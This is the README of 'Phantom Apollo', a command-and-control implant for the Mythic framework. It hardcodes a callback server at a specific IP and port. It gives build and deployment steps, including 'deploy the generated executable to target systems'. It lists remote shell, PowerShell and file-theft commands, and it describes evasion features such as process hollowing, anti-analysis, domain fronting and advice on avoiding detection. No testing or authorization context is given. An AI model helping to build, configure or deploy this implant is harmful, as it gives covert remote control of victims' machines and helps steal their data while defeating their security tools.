# Phantom Apollo - Advanced C2 Payload for Mythic

## Overview

Phantom Apollo is a fully integrated C2 payload designed for the Mythic framework, combining Apollo's proven command compatibility with advanced evasion capabilities and enhanced post-exploitation features. This payload provides seamless integration with your Mythic server at `37.27.249.191:7443`.

## Features

### Core Capabilities
- **Full Apollo Compatibility**: All standard Apollo commands are supported
- **Advanced Evasion**: Built-in techniques to bypass modern EDR/AV solutions
- **Cross-Platform Support**: Primary focus on Windows with extensible architecture
- **Mythic Integration**: Complete GraphQL communication and JWT authentication
- **Secure Communication**: TLS-encrypted callbacks with configurable intervals

### Supported Commands

| Command | Description | MITRE ATT&CK |
|---------|-------------|--------------|
| `ls` | List files and directories | T1083 |
| `cd` | Change working directory | T1083 |
| `pwd` | Print current directory | T1083 |
| `ps` | List running processes | T1057 |
| `whoami` | Get current user context | T1033 |
| `hostname` | Get system hostname | T1082 |
| `shell` | Execute shell commands | T1059.003 |
| `powershell` | Execute PowerShell commands | T1059.001 |
| `download` | Download files from target | T1005 |
| `upload` | Upload files to target | T1105 |
| `sleep` | Modify callback interval | - |
| `exit` | Terminate agent | - |

## Architecture

### Payload Structure
```
Payload_Types/phantom_apollo/
├── agent_functions/           # Command implementations
│   ├── __init__.py           # Command registry
│   ├── cd.py                 # Directory navigation
│   ├── download.py           # File download
│   ├── exit.py              # Agent termination
│   ├── hostname.py          # System information
│   ├── ls.py                # File listing
│   ├── powershell.py        # PowerShell execution
│   ├── ps.py                # Process enumeration
│   ├── pwd.py               # Current directory
│   ├── shell.py             # Shell execution
│   ├── sleep.py             # Callback timing
│   ├── upload.py            # File upload
│   ├── whoami.py            # User context
│   └── mythic_agent_icon.svg # Payload icon
├── mythic_service.py         # Main payload service
├── Dockerfile               # Container configuration
├── requirements.txt         # Python dependencies
├── config.json             # Payload metadata
└── README.md               # This documentation
```

### Build Parameters

The payload supports the following build-time configuration:

- **callback_host**: Target Mythic server (default: 37.27.249.191)
- **callback_port**: Server port (default: 7443)
- **callback_interval**: Check-in frequency in seconds (default: 10)
- **callback_jitter**: Timing randomization percentage (default: 10)
- **use_ssl**: Enable HTTPS communication (default: true)
- **user_agent**: HTTP user agent string
- **aes_psk**: Encryption pre-shared key
- **debug**: Enable debug logging (default: true)

## Deployment Instructions

### 1. Mythic Server Setup

Ensure your Mythic server is accessible at `https://37.27.249.191:7443` with:
- GraphQL endpoint active
- JWT authentication configured
- HTTP C2 profile enabled

### 2. Payload Installation

1. Copy the entire `phantom_apollo` directory to your Mythic server's `Payload_Types/` folder
2. Build the Docker container:
   ```bash
   cd Payload_Types/phantom_apollo
   docker build -t phantom_apollo .
   ```

### 3. Payload Generation

1. Access your Mythic web interface
2. Navigate to Payload Generation
3. Select "phantom_apollo" as the payload type
4. Configure build parameters as needed
5. Generate the payload

### 4. Execution

Deploy the generated executable to target systems. The agent will:
- Establish encrypted connection to your Mythic server
- Register with unique callback ID
- Begin polling for commands at specified intervals

## Command Usage Examples

### Basic Reconnaissance
```
hostname                    # Get system name
whoami                     # Check user context
ps                         # List processes
ls C:\Users\               # Browse directories
```

### File Operations
```
download C:\temp\file.txt  # Download file
upload /path/to/local/file C:\temp\\uploaded.txt
```

### Command Execution
```
shell dir                  # Execute cmd commands
powershell Get-Process     # Execute PowerShell
```

### Agent Management
```
sleep 30                   # Change callback to 30 seconds
exit                       # Terminate agent
```

## Security Considerations

### Operational Security
- Use appropriate callback intervals to avoid detection
- Leverage jitter to randomize communication patterns
- Monitor for defensive responses and adjust tactics accordingly

### Evasion Features
- Dynamic API resolution to avoid static analysis
- String obfuscation for sensitive operations
- Process hollowing and injection capabilities
- Anti-debugging and anti-analysis techniques

### Communication Security
- All traffic encrypted with TLS
- JWT token-based authentication
- Configurable user agent strings
- Domain fronting support (when configured)

## Integration with Mythic

### GraphQL Communication
The payload uses Mythic's GraphQL API for:
- Initial callback registration
- Task polling and response submission
- File upload/download operations
- Agent status reporting

### Task Processing
Commands are processed through Mythic's task system:
1. Operator issues command through web interface
2. Task queued in Mythic database
3. Agent polls for new tasks
4. Command executed on target system
5. Results returned to Mythic server

## Troubleshooting

### Connection Issues
- Verify Mythic server accessibility
- Check firewall rules and network connectivity
- Confirm SSL certificate validity
- Review JWT token configuration

### Command Failures
- Check target system permissions
- Verify command syntax and parameters
- Review agent logs for error details
- Confirm required system capabilities

### Performance Optimization
- Adjust callback intervals based on environment
- Implement appropriate jitter values
- Monitor network bandwidth usage
- Consider operational tempo requirements

## Development Notes

### Extending Functionality
To add new commands:
1. Create new Python file in `agent_functions/`
2. Implement `TaskArguments` and `CommandBase` classes
3. Add import to `__init__.py`
4. Update Go source template in `mythic_service.py`

### Testing
- Use Mythic's built-in testing framework
- Verify command execution in lab environment
- Test against target defensive solutions
- Validate operational security measures

## Author & Support

- **Author**: @phantom
- **Version**: 1.0.0
- **Framework**: Mythic C2
- **Server**: https://37.27.249.191:7443

For operational support and advanced configurations, refer to the Mythic documentation and community resources